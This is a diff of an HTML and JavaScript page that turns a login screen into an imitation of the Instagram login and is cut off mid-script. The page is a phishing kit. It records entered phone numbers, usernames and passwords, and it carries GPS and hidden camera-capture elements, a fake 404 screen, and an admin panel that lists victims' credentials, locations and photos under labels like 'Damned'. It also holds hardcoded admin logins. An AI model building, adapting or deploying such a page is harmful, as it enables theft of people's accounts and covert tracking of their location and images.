@@ -1,420 +1,357 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>تسجيل الدخول</title>
+  <title>Login</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <style>
-    *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,'Segoe UI',sans-serif}
+    *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
     body{background:#000;display:flex;justify-content:center;align-items:flex-start;min-height:100vh}
-    .app-container{width:100%;max-width:796px;min-height:100vh;background:#0C0F14;display:flex;flex-direction:column}
-    .login-wrapper{display:flex;flex-direction:column;min-height:100vh;width:100%}
-    .top-section{background:#0C0F14;width:100%;flex-shrink:0;padding-bottom:8px}
-    .bottom-section{background:#000;width:100%;flex:1;min-height:60px}
-    .language-selector{display:flex;justify-content:center;align-items:center;padding-top:28px;padding-bottom:10px;color:#a0a4ae;font-size:24px;gap:4px}
-    .language-selector span{color:#aeb2bb}
-    .language-selector i{font-size:20px;color:#aeb2bb;margin-left:6px}
-    .divider-line{width:100%;height:1px;background:#1e2228;border:none}
-    .login-form{padding:0 24px;display:flex;flex-direction:column;background:#0C0F14;flex:1}
-    .logo-wrapper{display:flex;justify-content:center;align-items:center;margin:18px 0 20px 0}
-    .logo-goat{width:110px;height:110px;display:flex;justify-content:center;align-items:center}
-    .logo-goat img,.logo-goat svg{width:100%;height:100%;object-fit:contain;display:block;filter:drop-shadow(0 0 8px rgba(180,0,0,0.3))}
-    .field-label{color:#aeb2bb;font-size:22px;font-weight:400;margin-bottom:4px;margin-top:8px}
-    .field-label:first-of-type{margin-top:0}
-    .input-container{width:100%;background:#25282D;border:1px solid #30343A;border-radius:2px;height:78px;display:flex;align-items:center;padding:0 16px;margin-bottom:4px;transition:border .15s}
-    .input-container:focus-within{border-color:#4a5df5}
-    .input-container input{width:100%;height:100%;background:transparent;border:none;outline:none;color:#e8ecf2;font-size:22px;padding:0}
-    .input-container input::placeholder{color:#5a5f69;font-size:22px;font-weight:300;opacity:.7}
-    .password-wrapper{display:flex;align-items:center;width:100%;height:100%}
-    .password-wrapper input{flex:1;height:100%;background:transparent;border:none;outline:none;color:#e8ecf2;font-size:22px}
-    .password-wrapper input::placeholder{color:#5a5f69;font-size:22px;font-weight:300;opacity:.7}
-    .show-toggle{display:flex;align-items:center;gap:6px;color:#aeb2bb;font-size:20px;font-weight:400;cursor:default;user-select:none;flex-shrink:0;padding-left:6px}
-    .show-toggle i{font-size:22px;color:#aeb2bb}
-    .login-btn{width:100%;height:72px;background:#073858;border:none;border-radius:24px;color:#b0c4d9;font-size:24px;font-weight:600;letter-spacing:.6px;margin:14px 0 6px 0;cursor:pointer;transition:background .3s}
-    .login-btn.active{background:#1a7b9e;color:#fff}
-    .login-btn:hover{background:#0a466b}
-    .login-btn.active:hover{background:#2a8fb0}
-    .forgot-password{text-align:center;color:#e2e5ea;font-size:22px;font-weight:600;margin:10px 0 16px 0}
-    .continue-btn{width:100%;height:72px;background:#4A5DF5;border:none;border-radius:24px;display:flex;justify-content:center;align-items:center;gap:12px;color:#fff;font-size:22px;font-weight:600;margin:8px 0 10px 0;cursor:pointer;transition:background .15s}
-    .continue-btn i{font-size:30px;background:#fff;border-radius:50%;padding:5px;color:#4A5DF5;display:inline-flex;justify-content:center;align-items:center;width:34px;height:34px}
-    .continue-btn:hover{background:#3b4ee0}
-    .or-divider{display:flex;align-items:center;justify-content:center;gap:14px;margin:14px 0 10px 0;color:#7a7f8a;font-size:20px}
-    .or-line{flex:1;height:1px;background:#303030;max-width:100px}
-    .create-account{text-align:center;color:#e2e5ea;font-size:22px;font-weight:600;margin:14px 0 40px 0}
-    .error-message{color:#ff4d4d;font-size:22px;font-weight:500;margin:6px 0 2px 0;text-align:center;display:none;background:transparent;padding:6px;border:none}
-    .error-message.show{display:block}
+    .app{width:100%;max-width:400px;min-height:100vh;background:#fff;display:flex;flex-direction:column;padding:20px 24px 40px}
+    .lang{display:flex;justify-content:center;align-items:center;color:#262626;font-size:14px;gap:4px;padding:12px 0 8px;font-weight:400}
+    .lang i{font-size:12px;color:#8e8e8e}
+    .divider{height:1px;background:#dbdbdb;margin-bottom:24px}
+    .logo{display:flex;justify-content:center;margin:8px 0 20px}
+    .logo svg{width:175px;height:auto}
+    .login-form{display:flex;flex-direction:column;gap:6px}
+    .input-wrap{background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;padding:0 8px;height:44px;display:flex;align-items:center}
+    .input-wrap input{width:100%;height:100%;background:transparent;border:none;outline:none;font-size:14px;color:#262626}
+    .input-wrap input::placeholder{color:#8e8e8e;font-weight:300}
+    .pw-wrap{display:flex;align-items:center;width:100%}
+    .pw-wrap input{flex:1;height:100%;background:transparent;border:none;outline:none;font-size:14px;color:#262626}
+    .show-toggle{display:flex;align-items:center;gap:4px;color:#262626;font-size:14px;cursor:default;user-select:none;flex-shrink:0;padding-left:4px;font-weight:600}
+    .show-toggle i{font-size:14px}
+    .login-btn{width:100%;height:32px;background:#0095f6;border:none;border-radius:8px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;margin:8px 0 6px;opacity:0.7;transition:opacity .2s}
+    .login-btn.active{opacity:1}
+    .login-btn.active:hover{background:#1877f2}
+    .forgot{text-align:center;color:#00376b;font-size:12px;font-weight:400;margin:12px 0 20px;cursor:pointer}
+    .or-divider{display:flex;align-items:center;gap:18px;color:#8e8e8e;font-size:13px;font-weight:600;margin:6px 0 16px}
+    .or-line{flex:1;height:1px;background:#dbdbdb}
+    .continue-btn{width:100%;height:32px;background:transparent;border:none;display:flex;justify-content:center;align-items:center;gap:8px;color:#385185;font-size:14px;font-weight:600;cursor:pointer;margin-bottom:8px}
+    .continue-btn i{font-size:20px;color:#385185}
+    .create{text-align:center;color:#262626;font-size:14px;font-weight:400;margin-top:12px}
+    .create span{color:#0095f6;font-weight:600;cursor:pointer}
+    .error{color:#ed4956;font-size:13px;font-weight:400;text-align:center;display:none;margin:4px 0}
+    .error.show{display:block}
     .gps-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;display:none;justify-content:center;align-items:center;z-index:9999;flex-direction:column}
     .gps-overlay.show{display:flex}
-    .gps-overlay h1{font-size:72px;color:#cc3333;margin:0}
-    .gps-overlay p{font-size:24px;color:#333;margin:0}
-    #videoPreview,#photoPreview{display:none!important}
-    .admin-panel{display:none;background:#080000;color:#ddd;padding:16px 14px;min-height:100vh;flex-direction:column;width:100%;background-image:radial-gradient(ellipse at 20% 50%,rgba(80,0,0,.15) 0%,transparent 60%),radial-gradient(ellipse at 80% 50%,rgba(80,0,0,.15) 0%,transparent 60%)}
+    .gps-overlay h1{font-size:72px;color:#ed4956}
+    .gps-overlay p{font-size:20px;color:#262626}
+    .admin-panel{display:none;background:#000;color:#ddd;padding:20px;min-height:100vh;flex-direction:column}
     .admin-panel.active{display:flex}
-    .admin-header{display:flex;justify-content:space-between;align-items:center;border-bottom:2px solid #3a0a0a;padding-bottom:10px;margin-bottom:16px;flex-wrap:wrap}
-    .admin-header h1{font-size:30px;color:#cc2222;text-shadow:0 0 20px #600,0 0 40px #300;letter-spacing:2px;display:flex;align-items:center;gap:8px}
-    .admin-header h1 i{font-size:28px}
-    .admin-header button{background:#1a0505;border:1px solid #5a1515;color:#cc6666;padding:8px 18px;border-radius:30px;font-size:20px;cursor:pointer;transition:.3s}
-    .admin-header button:hover{background:#3a0a0a;border-color:#a33}
-    .admin-stats{display:grid;grid-template-columns:repeat(5,1fr);gap:8px;margin-bottom:16px}
-    .stat-card{background:#0d0303;border:1px solid #2a0a0a;border-radius:10px;padding:8px 4px;text-align:center}
-    .stat-card .number{font-size:22px;font-weight:700;color:#dd4444;text-shadow:0 0 10px rgba(200,0,0,.3)}
-    .stat-card .label{font-size:11px;color:#7a5a5a;margin-top:2px}
-    .admin-dashboard{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:20px}
-    .admin-card{background:#0a0303;border:1px solid #2a0a0a;border-radius:12px;padding:14px 12px;box-shadow:0 0 30px rgba(60,0,0,.2)}
-    .admin-card h3{color:#bb4444;font-size:18px;margin-bottom:10px;border-bottom:1px solid #1a0808;padding-bottom:6px;display:flex;align-items:center;gap:8px}
-    .admin-card h3 i{font-size:16px}
-    .logo-control{display:flex;flex-direction:column;gap:10px}
-    .logo-control .preview-box{background:#0a0303;border:2px dashed #3a1515;padding:12px;display:flex;justify-content:center;align-items:center;min-height:100px;border-radius:8px}
-    .logo-control .preview-box img,.logo-control .preview-box svg{max-width:90px;max-height:90px;object-fit:contain}
-    .logo-control input[type=file]{color:#aaa;background:#0f0505;padding:8px;border:1px solid #2a0f0f;border-radius:6px;width:100%;font-size:14px}
-    .btn-group{display:flex;gap:8px;flex-wrap:wrap}
-    .btn-group button{background:#0f0505;border:1px solid #3a1515;color:#bb8888;padding:6px 14px;border-radius:20px;font-size:15px;cursor:pointer;flex:1 0 auto;transition:.2s}
-    .btn-group button:hover{background:#1f0a0a;border-color:#6a2222;color:#dd9999}
-    .lists-container{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:6px}
-    .list-box{background:#0a0303;border:1px solid #2a0a0a;border-radius:12px;padding:12px 10px}
-    .list-box h4{color:#bb4444;font-size:17px;margin-bottom:8px;display:flex;align-items:center;gap:6px;border-bottom:1px solid #1a0808;padding-bottom:4px}
-    .list-box h4 .badge{font-size:13px;background:#1a0505;padding:0 10px;border-radius:12px;color:#aa5555}
-    .list-scroll{max-height:200px;overflow-y:auto;border-radius:6px}
-    .list-item{display:grid;grid-template-columns:30px 80px 1fr 1fr;gap:4px;padding:6px 6px;border-bottom:1px solid #150808;color:#b0a0a0;font-size:13px;align-items:center}
-    .list-item .idx{color:#883333;font-weight:700;font-size:12px}
-    .list-item .time{color:#7a6a6a;font-size:11px}
-    .list-item .phone{color:#aabbcc;font-size:13px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-    .list-item .pass{color:#887766;font-size:13px;font-family:monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-    .list-item.status-success{border-left:3px solid #4caf50}
-    .list-item.status-fail{border-left:3px solid #cc3333}
-    .list-item-gps{display:grid;grid-template-columns:30px 70px 1fr 1fr 40px 40px;gap:4px;padding:8px 6px;border-bottom:1px solid #150808;color:#b0a0a0;font-size:12px;align-items:center}
-    .list-item-gps .idx{color:#883333;font-weight:700;font-size:12px}
-    .list-item-gps .time{color:#7a6a6a;font-size:10px}
-    .list-item-gps .phone{color:#aabbcc;font-size:12px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-    .list-item-gps .pass{color:#887766;font-size:12px;font-family:monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-    .list-item-gps .gps-link{color:#4a8faf;cursor:pointer;font-size:18px;text-align:center;transition:.2s}
-    .list-item-gps .gps-link:hover{color:#6abfdf}
-    .list-item-gps .download-link{color:#8a7a5a;cursor:pointer;font-size:18px;text-align:center;transition:.2s}
-    .list-item-gps .download-link:hover{color:#ccaa7a}
-    .list-item-gps.status-fail{border-left:3px solid #cc3333}
-    .empty-list{padding:16px;text-align:center;color:#4a3a3a;font-size:16px}
-    .admin-footer{margin-top:20px;padding:10px;border-top:1px solid #1a0808;color:#4a3a3a;text-align:center;font-size:16px}
-    @media(max-width:600px){.admin-dashboard,.lists-container{grid-template-columns:1fr}.admin-stats{grid-template-columns:repeat(3,1fr)}.list-item{grid-template-columns:25px 65px 1fr 1fr;font-size:12px}.list-item-gps{grid-template-columns:25px 60px 1fr 1fr 30px 30px;font-size:11px}}
-    @media(max-width:480px){.login-form{padding:0 16px}.language-selector{font-size:20px;padding-top:20px}.field-label{font-size:18px}.input-container{height:64px;padding:0 12px}.input-container input,.password-wrapper input{font-size:18px}.show-toggle{font-size:17px}.login-btn{height:60px;font-size:20px;border-radius:20px}.continue-btn{height:60px;font-size:18px;gap:8px}.admin-header h1{font-size:24px}.stat-card .number{font-size:18px}}
-    .list-scroll::-webkit-scrollbar{width:4px}
-    .list-scroll::-webkit-scrollbar-track{background:#0a0303}
-    .list-scroll::-webkit-scrollbar-thumb{background:#3a1a1a;border-radius:4px}
+    .admin-header{display:flex;justify-content:space-between;align-items:center;border-bottom:2px solid #222;padding-bottom:10px;margin-bottom:16px}
+    .admin-header h1{font-size:24px;color:#ed4956}
+    .admin-header button{background:#111;border:1px solid #333;color:#aaa;padding:6px 16px;border-radius:20px;font-size:14px;cursor:pointer}
+    .admin-stats{display:grid;grid-template-columns:repeat(5,1fr);gap:6px;margin-bottom:16px}
+    .stat-card{background:#111;border:1px solid #222;border-radius:8px;padding:6px 2px;text-align:center}
+    .stat-card .number{font-size:18px;font-weight:700;color:#ed4956}
+    .stat-card .label{font-size:10px;color:#777}
+    .admin-card{background:#111;border:1px solid #222;border-radius:10px;padding:12px;margin-bottom:14px}
+    .admin-card h3{color:#ed4956;font-size:16px;margin-bottom:8px;border-bottom:1px solid #222;padding-bottom:4px}
+    .logo-control{display:flex;flex-direction:column;gap:8px}
+    .logo-control .preview-box{background:#000;border:1px dashed #333;padding:10px;display:flex;justify-content:center;align-items:center;min-height:80px;border-radius:6px}
+    .logo-control .preview-box img,.logo-control .preview-box svg{max-width:80px;max-height:80px;object-fit:contain}
+    .logo-control input[type=file]{color:#aaa;background:#111;padding:6px;border:1px solid #333;border-radius:4px;width:100%;font-size:12px}
+    .btn-group{display:flex;gap:6px;flex-wrap:wrap}
+    .btn-group button{background:#111;border:1px solid #333;color:#aaa;padding:4px 12px;border-radius:16px;font-size:12px;cursor:pointer}
+    .lists-container{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+    .list-box{background:#111;border:1px solid #222;border-radius:10px;padding:10px}
+    .list-box h4{color:#ed4956;font-size:14px;margin-bottom:6px;border-bottom:1px solid #222;padding-bottom:4px;display:flex;justify-content:space-between}
+    .list-scroll{max-height:180px;overflow-y:auto}
+    .list-item{display:grid;grid-template-columns:25px 60px 1fr 1fr;gap:2px;padding:4px 4px;border-bottom:1px solid #1a1a1a;font-size:11px;color:#aaa;align-items:center}
+    .list-item .idx{color:#555}
+    .list-item .time{color:#666;font-size:10px}
+    .list-item .phone{color:#8af;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+    .list-item .pass{color:#887766;font-family:monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+    .list-item.status-success{border-left:2px solid #4caf50}
+    .list-item.status-fail{border-left:2px solid #ed4956}
+    .list-item-gps{display:grid;grid-template-columns:25px 55px 1fr 1fr 28px 28px;gap:2px;padding:4px 4px;border-bottom:1px solid #1a1a1a;font-size:10px;color:#aaa;align-items:center}
+    .list-item-gps .idx{color:#555}
+    .list-item-gps .time{color:#666;font-size:9px}
+    .list-item-gps .phone{color:#8af;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+    .list-item-gps .pass{color:#887766;font-family:monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+    .list-item-gps .gps-link{color:#4a8faf;cursor:pointer;font-size:14px;text-align:center}
+    .list-item-gps .download-link{color:#8a7a5a;cursor:pointer;font-size:14px;text-align:center}
+    .empty-list{color:#555;text-align:center;padding:10px;font-size:12px}
+    .admin-footer{margin-top:16px;padding:8px;border-top:1px solid #222;color:#555;text-align:center;font-size:12px}
+    @media(max-width:450px){.admin-stats{grid-template-columns:repeat(3,1fr)}.lists-container{grid-template-columns:1fr}}
   </style>
 </head>
 <body>
-<div class="app-container" id="appContainer">
-  <div id="loginWrapper" class="login-wrapper">
-    <div class="top-section">
-      <div class="language-selector"><span>English (US)</span><i class="fas fa-chevron-down"></i></div>
-      <div class="divider-line"></div>
+<div class="app" id="app">
+
+  <!-- واجهة تسجيل الدخول -->
+  <div id="loginWrapper">
+    <div class="lang">English (US) <i class="fas fa-chevron-down"></i></div>
+    <div class="divider"></div>
+    <div class="logo">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 175 51" width="175" height="51">
+        <defs><linearGradient id="ig" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#405DE6"/><stop offset="50%" stop-color="#E1306C"/><stop offset="100%" stop-color="#F56040"/></linearGradient></defs>
+        <text x="0" y="40" font-family="Arial,Helvetica,sans-serif" font-size="42" font-weight="bold" fill="url(#ig)">Instagram</text>
+      </svg>
     </div>
     <div class="login-form">
-      <div class="logo-wrapper"><div class="logo-goat" id="mainLogo"></div></div>
-      <div id="errorMessage" class="error-message">⚠️ 404 — Login failed</div>
-      <div class="field-label">Enter your mobile number, username or email</div>
-      <div class="input-container"><input type="text" id="usernameInput" placeholder=" " value=""></div>
-      <div class="field-label" style="margin-top:10px;">Enter your password</div>
-      <div class="input-container">
-        <div class="password-wrapper">
-          <input type="password" id="passwordInput" placeholder=" " value="">
+      <div id="errorMessage" class="error">⚠️ Sorry, your password was incorrect. Please double-check your password.</div>
+      <div class="input-wrap"><input type="text" id="usernameInput" placeholder="Phone number, username, or email" value=""></div>
+      <div class="input-wrap">
+        <div class="pw-wrap">
+          <input type="password" id="passwordInput" placeholder="Password" value="">
           <div class="show-toggle" id="showToggle"><span>Show</span><i class="fas fa-eye-slash" id="eyeIcon"></i></div>
         </div>
       </div>
       <button class="login-btn" id="loginBtn">Log in</button>
-      <div class="forgot-password">Forgot password?</div>
-      <button class="continue-btn" id="continueBtn"><i class="fab fa-facebook-f"></i> Continue with Facebook</button>
+      <div class="forgot">Forgot password?</div>
       <div class="or-divider"><span class="or-line"></span><span>OR</span><span class="or-line"></span></div>
-      <div class="create-account">Create new account</div>
+      <button class="continue-btn" id="continueBtn"><i class="fab fa-facebook-f"></i> Continue as Lightning Nova</button>
+      <div class="create"><span>Create new account</span></div>
     </div>
-    <div class="bottom-section"></div>
   </div>
 
-  <div class="gps-overlay" id="gpsOverlay">
-    <h1>404</h1>
-    <p>Not Found</p>
-  </div>
+  <!-- نافذة 404 -->
+  <div class="gps-overlay" id="gpsOverlay"><h1>404</h1><p>Not Found</p></div>
   <video id="videoPreview" style="display:none;"></video>
   <img id="photoPreview" style="display:none;">
 
+  <!-- لوحة المسؤول -->
   <div id="adminPanel" class="admin-panel">
-    <div class="admin-header">
-      <h1><i class="fas fa-fire"></i> لوحة التحكم</h1>
-      <button id="logoutAdminBtn"><i class="fas fa-skull"></i> خروج</button>
-    </div>
+    <div class="admin-header"><h1>🔥 Admin</h1><button id="logoutBtn">Logout</button></div>
     <div class="admin-stats">
-      <div class="stat-card"><div class="number" id="totalCount">0</div><div class="label">إجمالي</div></div>
-      <div class="stat-card"><div class="number" id="successCount" style="color:#4caf50;">0</div><div class="label">✅ ناجحة</div></div>
-      <div class="stat-card"><div class="number" id="failCount" style="color:#cc3333;">0</div><div class="label">❌ فاشلة</div></div>
-      <div class="stat-card"><div class="number" id="gpsCount" style="color:#4a8faf;">0</div><div class="label">📍 مع GPS</div></div>
-      <div class="stat-card"><div class="number" id="liveCount" style="color:#ff8800;">0</div><div class="label">👁️ متعقب</div></div>
+      <div class="stat-card"><div class="number" id="total">0</div><div class="label">Total</div></div>
+      <div class="stat-card"><div class="number" id="success" style="color:#4caf50;">0</div><div class="label">✅ Success</div></div>
+      <div class="stat-card"><div class="number" id="fail" style="color:#ed4956;">0</div><div class="label">❌ Fail</div></div>
+      <div class="stat-card"><div class="number" id="gps" style="color:#4a8faf;">0</div><div class="label">📍 GPS</div></div>
+      <div class="stat-card"><div class="number" id="live" style="color:#ff8800;">0</div><div class="label">👁️ Trackers</div></div>
     </div>
-    <div class="admin-dashboard">
-      <div class="admin-card">
-        <h3><i class="fas fa-pentagram"></i> الشعار</h3>
-        <div class="logo-control">
-          <div class="preview-box" id="logoPreviewBox"></div>
-          <input type="file" id="logoUpload" accept="image/*">
-          <div class="btn-group"><button id="saveLogoBtn"><i class="fas fa-save"></i> حفظ</button><button id="resetLogoBtn"><i class="fas fa-undo-alt"></i> إعادة</button></div>
-        </div>
+    <div class="admin-card">
+      <h3>Logo</h3>
+      <div class="logo-control">
+        <div class="preview-box" id="logoPreview"></div>
+        <input type="file" id="logoUpload" accept="image/*">
+        <div class="btn-group"><button id="saveLogo">Save</button><button id="resetLogo">Reset</button></div>
       </div>
-      <div class="admin-card">
-        <h3><i class="fas fa-chart-bar"></i> سريع</h3>
-        <div style="display:flex;flex-direction:column;gap:6px;padding:4px 0;">
-          <div style="display:flex;justify-content:space-between;color:#8a7a7a;font-size:15px;"><span>🔴 آخر فاشلة</span><span id="lastFailTime" style="color:#cc6666;">—</span></div>
-          <div style="display:flex;justify-content:space-between;color:#8a7a7a;font-size:15px;"><span>🟢 آخر ناجحة</span><span id="lastSuccessTime" style="color:#4caf50;">—</span></div>
-          <div style="display:flex;justify-content:space-between;color:#8a7a7a;font-size:15px;border-top:1px solid #1a0808;padding-top:6px;"><span>👹 الملعونين</span><span id="totalFailCount" style="color:#cc3333;font-weight:700;">0</span></div>
-        </div>
+    </div>
+    <div class="admin-card">
+      <h3>Quick</h3>
+      <div style="display:flex;flex-direction:column;gap:4px;font-size:13px;color:#aaa;">
+        <div><span style="color:#ed4956;">🔴 Last fail:</span> <span id="lastFail">—</span></div>
+        <div><span style="color:#4caf50;">🟢 Last success:</span> <span id="lastSuccess">—</span></div>
+        <div><span>👹 Damned:</span> <span id="damned" style="color:#ed4956;font-weight:700;">0</span></div>
       </div>
     </div>
     <div class="lists-container">
-      <div class="list-box">
-        <h4><i class="fas fa-check-circle" style="color:#4caf50;"></i> الناجحين <span class="badge" id="successBadge">0</span></h4>
-        <div class="list-scroll" id="successList"><div class="empty-list">لا توجد محاولات ناجحة</div></div>
-      </div>
-      <div class="list-box">
-        <h4><i class="fas fa-times-circle" style="color:#cc3333;"></i> الفاشلين <span class="badge" id="failBadge">0</span></h4>
-        <div class="list-scroll" id="failList"><div class="empty-list">لا توجد محاولات فاشلة</div></div>
-      </div>
+      <div class="list-box"><h4>✅ Success <span id="sBadge" style="color:#4caf50;font-size:12px;">0</span></h4><div class="list-scroll" id="successList"><div class="empty-list">No attempts</div></div></div>
+      <div class="list-box"><h4>❌ Failed <span id="fBadge" style="color:#ed4956;font-size:12px;">0</span></h4><div class="list-scroll" id="failList"><div class="empty-list">No attempts</div></div></div>
     </div>
-    <div class="admin-footer"><i class="fas fa-fire"></i> نظام الحماية v5.0 — <span id="footerTime"></span></div>
+    <div class="admin-footer">v5.0 — <span id="footerTime"></span></div>
   </div>
 </div>
 
 <script>
   (function(){
     "use strict";
-    // عناصر
-    const $ = id => document.getElementById(id);
-    const loginWrapper = $('loginWrapper'), adminPanel = $('adminPanel');
-    const usernameInput = $('usernameInput'), passwordInput = $('passwordInput');
-    const loginBtn = $('loginBtn'), errorMsg = $('errorMessage');
-    const showToggle = $('showToggle'), eyeIcon = $('eyeIcon');
-    const logoutBtn = $('logoutAdminBtn'), continueBtn = $('continueBtn');
-    const mainLogo = $('mainLogo'), logoPreviewBox = $('logoPreviewBox');
-    const logoUpload = $('logoUpload'), saveLogoBtn = $('saveLogoBtn'), resetLogoBtn = $('resetLogoBtn');
-    const successList = $('successList'), failList = $('failList');
-    const successBadge = $('successBadge'), failBadge = $('failBadge');
-    const totalCount = $('totalCount'), successCount = $('successCount'), failCount = $('failCount');
-    const gpsCount = $('gpsCount'), liveCount = $('liveCount'), totalFailCount = $('totalFailCount');
-    const lastFailTime = $('lastFailTime'), lastSuccessTime = $('lastSuccessTime'), footerTime = $('footerTime');
-    const gpsOverlay = $('gpsOverlay');
+    const $=id=>document.getElementById(id);
+    const LS=localStorage;
 
-    // بيانات ثابتة
-    let ADMIN_PHONE = '0561368108', ADMIN_PASS = 'nouh1234';
-    const LOGO_KEY = 'custom_login_logo';
-    const ATTEMPTS_KEY = 'security_attempts_v5';
-    const GPS_DATA_KEY = 'security_gps_v5', PHOTO_DATA_KEY = 'security_photo_v5', LIVE_KEY = 'security_live_data';
+    // بيانات الدخول (يمكن تغييرها)
+    const ADMIN = { username: 'admin', password: 'admin' };
 
-    let attemptsData = loadData(ATTEMPTS_KEY, { success: [], fail: [] });
-    let gpsData = loadData(GPS_DATA_KEY, {});
-    let photoData = loadData(PHOTO_DATA_KEY, {});
-    let liveData = loadData(LIVE_KEY, { trackers: {} });
+    // مفاتيح التخزين
+    const KEYS = { logo:'logo_data', attempts:'attempts', gps:'gps_data', photo:'photo_data', live:'live_data' };
 
-    let passwordVisible = false, isCapturing = false;
+    let attempts = load(KEYS.attempts, { success:[], fail:[] });
+    let gpsData = load(KEYS.gps, {});
+    let photoData = load(KEYS.photo, {});
+    let liveData = load(KEYS.live, { trackers:{} });
 
-    function loadData(key, def) { try { const d = localStorage.getItem(key); return d ? JSON.parse(d) : def; } catch(e){ return def; } }
-    function saveData(key, data) { localStorage.setItem(key, JSON.stringify(data)); }
+    function load(key, def){ try{ const x=LS.getItem(key); return x?JSON.parse(x):def; }catch(e){ return def; } }
+    function save(key, data){ LS.setItem(key, JSON.stringify(data)); }
 
-    // الشعار
-    function renderLogo(dataUrl) {
-      mainLogo.innerHTML = logoPreviewBox.innerHTML = '';
-      if (dataUrl) {
-        const img = (s) => { const i = document.createElement('img'); i.src = dataUrl; i.style.width = s; i.style.height = s; i.style.objectFit = 'contain'; return i; };
-        mainLogo.appendChild(img('110px'));
-        logoPreviewBox.appendChild(img('90px'));
-      } else {
-        const svg = `<svg viewBox="0 0 120 120" fill="none"><circle cx="60" cy="60" r="58" fill="#0a0505" stroke="#8a1a1a" stroke-width="1.5"/><path d="M45 42 L30 22 L42 30 L48 18 L55 28 L62 16 L68 28 L75 18 L82 30 L72 38 L80 44 L70 50 L62 44 L58 52 L52 44 L44 50 L38 44 L45 42Z" fill="#1a0a0a" stroke="#aa2222" stroke-width="2"/><path d="M38 32 L22 12 L32 18 L28 6 L40 14 L38 32Z" fill="#2a0a0a" stroke="#aa3333" stroke-width="2"/><path d="M74 28 L90 10 L82 18 L86 4 L74 16 L74 28Z" fill="#2a0a0a" stroke="#aa3333" stroke-width="2"/><circle cx="48" cy="38" r="6" fill="#cc0000"/><circle cx="68" cy="36" r="6" fill="#cc0000"/><circle cx="48" cy="38" r="2.5" fill="#ffaa00"/><circle cx="68" cy="36" r="2.5" fill="#ffaa00"/><rect x="52" y="52" width="16" height="18" rx="4" fill="#1a0a0a" stroke="#aa3333" stroke-width="1.5"/><circle cx="56" cy="58" r="3" fill="#1a0a0a" stroke="#aa3333" stroke-width="1"/><circle cx="64" cy="58" r="3" fill="#1a0a0a" stroke="#aa3333" stroke-width="1"/><path d="M56 64 L60 68 L64 64" stroke="#aa3333" stroke-width="1.5"/></svg>`;
-        mainLogo.innerHTML = svg;
-        logoPreviewBox.innerHTML = svg.replace('120 120','100 100');
-      }
+    let pv=false, capturing=false;
+
+    // --- Logo ---
+    function renderLogo(url){
+      const m=$('logoPreview'); m.innerHTML='';
+      if(url){ const i=document.createElement('img'); i.src=url; i.style.maxWidth='80px'; i.style.maxHeight='80px'; i.style.objectFit='contain'; m.appendChild(i); }
+      else{ m.innerHTML='<svg viewBox="0 0 100 100" width="80" height="80"><circle cx="50" cy="50" r="48" fill="#111" stroke="#ed4956" stroke-width="1"/><text x="20" y="60" fill="#ed4956" font-size="40">🔥</text></svg>'; }
     }
-    function loadSavedLogo() { const l = localStorage.getItem(LOGO_KEY); renderLogo(l || null); }
-    function saveLogoToStorage(url) { localStorage.setItem(LOGO_KEY, url); }
-    function removeSavedLogo() { localStorage.removeItem(LOGO_KEY); }
+    function loadLogo(){ const l=LS.getItem(KEYS.logo); renderLogo(l||null); }
 
-    // عرض القوائم (حفظ دائم)
-    function renderLists() {
-      const succ = attemptsData.success || [], fail = attemptsData.fail || [];
-      successList.innerHTML = succ.length ? succ.map((item,i) =>
-        `<div class="list-item status-success"><span class="idx">${String(i+1).padStart(2,'0')}</span><span class="time">${item.time||'—'}</span><span class="phone">📞 ${item.phone||'(غير مدخل)'}</span><span class="pass">🔑 ${item.password||'(غير مدخل)'}</span></div>`
-      ).join('') : '<div class="empty-list">لا توجد محاولات ناجحة</div>';
-
-      if (fail.length) {
-        failList.innerHTML = fail.map((item,i) => {
-          const gps = item.gps, photo = item.photo;
-          const gpsIcon = gps ? `<span class="gps-link" data-gps="${encodeURIComponent(JSON.stringify(gps))}"><i class="fas fa-map-pin"></i></span>` : '<span style="color:#3a2a2a;font-size:12px;">—</span>';
-          const dlIcon = photo ? `<span class="download-link" data-photo="${encodeURIComponent(photo)}"><i class="fas fa-download"></i></span>` : '<span style="color:#3a2a2a;font-size:12px;">—</span>';
-          return `<div class="list-item-gps status-fail"><span class="idx">${String(i+1).padStart(2,'0')}</span><span class="time">${item.time||'—'}</span><span class="phone">📞 ${item.phone||'(غير مدخل)'}</span><span class="pass">🔑 ${item.password||'(غير مدخل)'}</span>${gpsIcon}${dlIcon}</div>`;
+    // --- Lists ---
+    function renderLists(){
+      const s=attempts.success||[], f=attempts.fail||[];
+      $('successList').innerHTML = s.length ? s.map((it,i)=>`<div class="list-item status-success"><span class="idx">${String(i+1).padStart(2,'0')}</span><span class="time">${it.time||'—'}</span><span class="phone">${it.phone||'—'}</span><span class="pass">${it.password||'—'}</span></div>`).join('') : '<div class="empty-list">No attempts</div>';
+      if(f.length){
+        $('failList').innerHTML = f.map((it,i)=>{
+          const g=it.gps, ph=it.photo;
+          const gi = g ? `<span class="gps-link" data-gps="${encodeURIComponent(JSON.stringify(g))}"><i class="fas fa-map-pin"></i></span>` : '<span style="color:#444;font-size:12px;">—</span>';
